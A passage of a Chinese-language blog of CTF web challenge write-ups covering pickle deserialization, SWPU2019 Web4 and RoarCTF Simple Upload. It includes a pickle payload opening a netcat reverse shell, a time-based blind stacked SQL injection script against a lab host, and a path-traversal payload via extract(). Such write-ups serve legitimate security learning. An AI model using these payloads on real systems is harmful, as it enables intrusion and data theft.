<p>(注意这里不能利用<code>ls</code>等命令，会返回<code>500</code>。可能是解码后去找<code>moeny</code>等字段找不到所以报错了。可以通过反弹<code>shell</code>)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip address 9001  -e/bin/sh&#x27;)&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)))<br></code></pre></td></tr></table></figure>

<p><img src="/img/picklestoryyyyyyy2.png" srcset="/img/loading.gif" lazyload alt="picklestoryyyyyyy2"></p>
<h4 id="思路总结-2"><a href="#思路总结-2" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>pickle</code>反序列化：序列化后的数据格式？<code>dumps</code>和<code>loads</code>？如果不能直接执行命令(500)，是否可以考虑反弹<code>shell</code>？</p>
<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="/img/googlectf2019bnv1.png" srcset="/img/loading.gif" lazyload alt="googlectf2019bnv1"></p>
<p>抓包：</p>
<p><img src="/img/googlectf2019bnv2.png" srcset="/img/loading.gif" lazyload alt="googlectf2019bnv2"></p>
<p><code>&#123;&quot;message&quot;:&quot;120101345012450101230135012350150&quot;&#125;</code></p>
<p><code>&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</code></p>
<p><code>&#123;&quot;message&quot;:&quot;1234010123502402340&quot;&#125;</code></p>
<p>感觉这个<code>JSON</code>就是利用点但不知道该怎么用。。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/114420160">参考资料</a></p>
<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>登录界面，<code>URL</code>值得注意：<code>/index.php?r=Login/Index</code>，注册功能没开放</p>
<p><img src="/img/spuctfweb4-1.png" srcset="/img/loading.gif" lazyload alt="spuctfweb4-1"></p>
<p>利用伪协议读<code>index.php</code>没啥用。。抓包看下数据怎么传输的：</p>
<p><img src="/img/spuctfweb4-2.png" srcset="/img/loading.gif" lazyload alt="spuctfweb4-2"></p>
<p>试试<code>SQL</code>注入吧，用户名改成<code>admin&#39;</code>：</p>
<p><img src="/img/spuctfweb4-3.png" srcset="/img/loading.gif" lazyload alt="spuctfweb4-3"></p>
<p>拿字典<code>FUZZ</code>了一下发现没有啥过滤。。估计不是<code>SQL</code>注入？想办法看看这个<code>Lib/DBTool.php</code>也没法看。</p>
<p>后面去看了<code>wp</code>，说是<code>SQL</code>注入而且过滤了大多数关键字<code>select</code>啥的。。可是我很确定我在<code>FUZZ</code>的时候<code>select</code>和<code>123</code>的回显没任何区别。。后面尝试<code>admin&#39;</code>和<code>select&#39;</code>的时候发现第一个报错第二个不报错才知道是这么回事：只要回显<code>&#123;&quot;code&quot;:&quot;202&quot;,&quot;info&quot;:&quot;error username or password.&quot;&#125;</code>可以看成关键字被过滤了。。(唉感觉这个<code>waf</code>对我的理解能力来说不太友好)。后面在<code>FUZZ</code>的时候后面多加了个单引号(这样一来如果没被过滤直接回显语法错误，还是很好区分的)。</p>
<p>看了<code>wp</code>说是堆叠注入，一开始想用类似<code>x&#39;;show databases;--+</code>这种语句直接跑后面发现不行。。原因可能是这东西只能用在<code>mysqli</code>中？而这道题是<code>PDO</code>场景下的堆叠注入，只能考虑用预处理来处理。很好奇是怎么看出来是<code>PDO</code>注入的。。</p>
<p><a target="_blank" rel="noopener" href="https://syunaht.com/p/2798247945.html">参考资料</a></p>
<p>先判断是否存在堆叠注入：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;   报错</span><br><span class="hljs-string">admin&#x27;</span><span class="hljs-comment">--+  报错</span><br><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;; 用户名或密码错误</span><br><span class="hljs-string">admin&#x27;</span>;<span class="hljs-comment">--+  用户名或密码错误</span><br><span class="hljs-keyword">admin</span>&quot;   登录成功<br>admin;&#x27;   报错<br></code></pre></td></tr></table></figure>

<p>看了下其它师傅关于堆叠注入的判断方法：</p>
<p><strong>加单引号报错，加双引号不报错，加单引号和分号不报错，说明存在堆叠注入。</strong></p>
<p>然后简单看下FUZZ的结果，过滤了大量东西，不过SQL这东西会自动把十六进制转换成字符串</p>
<p><img src="/img/spuctfweb4-4.png" srcset="/img/loading.gif" lazyload alt="spuctfweb4-4"></p>
<p>网上偷的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author: c1e4r</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#题目地址</span><br>    url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#注入payload</span><br>    payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>        <span class="hljs-comment">#查询payload</span><br>        payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span><br>            datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;<br>            data = json.dumps(datas)<br>            times = time.time()<br>            res = requests.post(url = url, data = data)<br>            <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:<br>                flag = flag + <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_hex</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>

<p><code>glzjin_wants_a_girl_friend.zip</code></p>
<p>其中的<code>fun.php</code>存在文件包含(user_aotu_load方法)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;user_aotu_load&#x27;</span>))<br>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_aotu_load</span>(<span class="hljs-params"><span class="hljs-variable">$className</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Lib&#x27;</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$className</span>, <span class="hljs-string">&#x27;Controller&#x27;</span>) !== <span class="hljs-literal">FALSE</span> )<br>		&#123;<br>			<span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Controller&#x27;</span>;<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$className</span>, <span class="hljs-string">&#x27;Model&#x27;</span>) !== <span class="hljs-literal">FALSE</span> )<br>		&#123;<br>			<span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Model&#x27;</span>;<br>		&#125;<br>		<span class="hljs-variable">$classPath</span> = BASE_PATH . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$classPath&#125;</span>/<span class="hljs-subst">&#123;$className&#125;</span>.php&quot;</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$classPath</span>))<br>		&#123;<br>			<span class="hljs-keyword">include</span> <span class="hljs-variable">$classPath</span>;<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>注意这里：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$classPath</span> = BASE_PATH . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$classPath&#125;</span>/<span class="hljs-subst">&#123;$className&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$classPath</span>;<br></code></pre></td></tr></table></figure>

<p>不知道这个方法在哪里被调用了，看看别的文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 所有控制器的父类</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * 加载视图文件</span><br><span class="hljs-comment">	 * viewName 视图名称</span><br><span class="hljs-comment">	 * viewData 视图分配数据</span><br><span class="hljs-comment">	*/</span><br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$viewPath</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;viewPath))<br>		&#123;<br>			<span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$viewData</span>);<br>			<span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;viewPath;<br>		&#125;<br>	&#125;<br>	<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>发现了个<code>loadView</code>方法，存在<code>extract</code>和<code>include</code>。现在估计这两个方法都能读<code>flag</code>？继续找在哪里被调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 用户控制器</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-comment">// 访问列表</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$params</span> = <span class="hljs-variable">$_REQUEST</span>;<br>		<span class="hljs-variable">$userModel</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserModel</span>();<br>		<span class="hljs-variable">$listData</span> = <span class="hljs-variable">$userModel</span>-&gt;<span class="hljs-title function_ invoke__">getPageList</span>(<span class="hljs-variable">$params</span>);<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userList&#x27;</span>, <span class="hljs-variable">$listData</span> );<br>	&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionIndex</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$listData</span> = <span class="hljs-variable">$_REQUEST</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userIndex&#x27;</span>,<span class="hljs-variable">$listData</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>actionIndex</code>方法中的<code>$listData</code>完全可控，去<code>userIndex.php</code>看看：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$img_file</span>)) &#123;<br>                    <span class="hljs-variable">$img_file</span> = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;<br>                &#125;<br>                <span class="hljs-variable">$img_dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-variable">$img_file</span>;<br>                <span class="hljs-variable">$img_base64</span> = <span class="hljs-title function_ invoke__">imgToBase64</span>(<span class="hljs-variable">$img_dir</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="hljs-variable">$img_base64</span> . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;       <span class="hljs-comment">//图片形式展示</span><br>                <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>考虑到<code>loadview</code>方法中存在<code>extract</code>，直接<code>GET</code>或<code>POST</code>传<code>img_file=/../flag</code>就行。</p>
<p>注意<code>fun.php</code>下这个路由控制跳转：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))<br>&#123;<br>	<span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]);<br>	<span class="hljs-keyword">list</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>) = <span class="hljs-variable">$r</span>;<br>	<span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$controller&#125;</span>Controller&quot;</span>;<br>	<span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;action<span class="hljs-subst">&#123;$action&#125;</span>&quot;</span>;<br><br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$controller</span>))<br>	&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>))<br>		&#123;<br>			<span class="hljs-comment">//</span><br>		&#125;<br>		<span class="hljs-keyword">else</span><br>		&#123;<br>			<span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;LoginController&quot;</span>;<br>        <span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>	&#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">array</span>( (<span class="hljs-keyword">new</span> <span class="hljs-variable">$controller</span>), <span class="hljs-variable">$action</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:index.php?r=Login/Index&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><code>payload</code>:<code>index.php?r=User/Index&amp;img_file=/../flag.php</code></p>
<h4 id="思路总结-3"><a href="#思路总结-3" class="headerlink" title="思路总结:"></a>思路总结:</h4><p><code>index.php</code>会包含<code>fun.php</code>，<code>fun.php</code>下会对<code>$_REQUEST[&#39;r&#39;]</code>得到的参数以<code>/</code>分割：<code>$controller,$action</code>来调用指定<code>controller</code>下的指定方法。然后通过<code>extract</code>去覆盖<code>$img_file</code>的值，把结果以<code>base64</code>形式输出。</p>
<p>对于<code>REQUEST</code>这种超全局变量，GETPOST传都行。</p>
<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>调用Thinkphp框架上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$upload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Think\Upload</span>();<span class="hljs-comment">// 实例化上传类</span><br>        <span class="hljs-variable">$upload</span>-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// 设置附件上传大小</span><br>        <span class="hljs-variable">$upload</span>-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);<span class="hljs-comment">// 设置附件上传类型</span><br>        <span class="hljs-variable">$upload</span>-&gt;rootPath = <span class="hljs-string">&#x27;./Public/Uploads/&#x27;</span>;<span class="hljs-comment">// 设置附件上传目录</span><br>        <span class="hljs-variable">$upload</span>-&gt;savePath = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// 设置附件上传子目录</span><br>        <span class="hljs-variable">$info</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>() ;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$info</span>) &#123;<span class="hljs-comment">// 上传错误提示错误信息</span><br>          <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>());<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// 上传成功 获取上传文件信息</span><br>          <span class="hljs-variable">$url</span> = __ROOT__.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>

<p>这题完全不会做。。。<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/04/23/RoarCTF-2019-Simple-Upload/">参考资料1</a></p>
<p><a target="_blank" rel="noopener" href="https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/">参考资料2</a></p>
<p>thinkphp中upload类的upload方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * 上传单个文件</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span>  array  $file 文件数组</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@return</span> array        上传成功后的文件信息</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadOne</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-variable">$info</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>));<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span> ? <span class="hljs-variable">$info</span>[<span class="hljs-number">0</span>] : <span class="hljs-variable">$info</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * 上传文件</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> 文件信息数组 $files ，通常是 $_FILES数组</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$files</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;&#x27;</span> === <span class="hljs-variable">$files</span>) &#123;<br>          <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$files</span>)) &#123;<br>          <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-string">&#x27;没有上传的文件！&#x27;</span>;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br>........<br>      ........<br>  &#125;<br><br></code></pre></td></tr></table></figure>

<p>无参调用时，$files将为空串，且传入<code>$_FILES</code>数组，即多文件上传。而且注意</p>
